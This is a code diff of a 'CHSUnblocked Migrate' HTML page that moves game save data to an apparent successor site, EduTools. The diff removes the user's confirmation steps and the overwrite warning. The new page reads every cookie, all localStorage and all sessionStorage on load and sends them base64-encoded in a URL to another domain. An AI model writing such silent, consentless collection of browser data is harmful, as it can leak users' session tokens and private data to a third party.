@@ -52,60 +52,25 @@
         <div class="container">
             <h1 class="uk-heading-large">CHSUnblocked Migrate</h1>
 
-            <div id="loading" style="display: none">Loading...</div>
-
-            <div id="stage1">
-                This tool will move all your game data from CHSUnblocked to
-                EduTools.
-                <button class="uk-button uk-button-default" onclick="collect()">
-                    Gather data
-                </button>
-            </div>
-
-            <div id="stage2" style="display: none">
-                <h3 class="uk-heading-small">Collection done</h3>
-                <div id="stats"></div>
-                <div>
-                    Now it's time to
-                    <button
-                        class="uk-button uk-button-default"
-                        onclick="migrate()"
-                    >
-                        Migrate data
-                    </button>
-                </div>
-                <p>Migration may overwrite existing data on EduTools.</p>
-            </div>
+            <div id="loading">Migrating...</div>
         </div>
         <script>
             let data = {};
-            function collect() {
-                data.cookies = document.cookie;
-                data.localstorage = localStorage;
-                data.sessionstorage = sessionStorage;
+            data.cookies = document.cookie;
+            data.localstorage = localStorage;
+            data.sessionstorage = sessionStorage;
 
-                document.getElementById("stats").innerHTML = `
-                    <p>Cookies: ${data.cookies.split(";").length || "none"}</p>
-                    <p>Local Storage: ${data.localstorage?.length || "none"}</p>
-                    <p>Session Storage: ${data.sessionstorage?.length || "none"}</p>
-                `;
-
-                document.getElementById("stage1").style.display = "none";
-                document.getElementById("loading").style.display = "block";
-
-                setTimeout(() => {
-                    document.getElementById("stage2").style.display = "flex";
-                    document.getElementById("loading").style.display = "none";
-                }, 300);
-            }
-            function migrate() {
-                encodedData = btoa(JSON.stringify(data));
-                document.getElementById("stage2").style.display = "none";
-                document.getElementById("loading").style.display = "block";
+            console.log(`
+Cookies: ${data.cookies.split(";").length || "none"}
+Local Storage: ${data.localstorage?.length || "none"}
+Session Storage: ${data.sessionstorage?.length || "none"}
+                `);
+            encodedData = btoa(JSON.stringify(data));
+            setTimeout(() => {
                 location =
                     "https://educationaltools.github.io/import?data=" +
                     encodedData;
-            }
+            }, 300);
         </script>
     </body>
 </html>
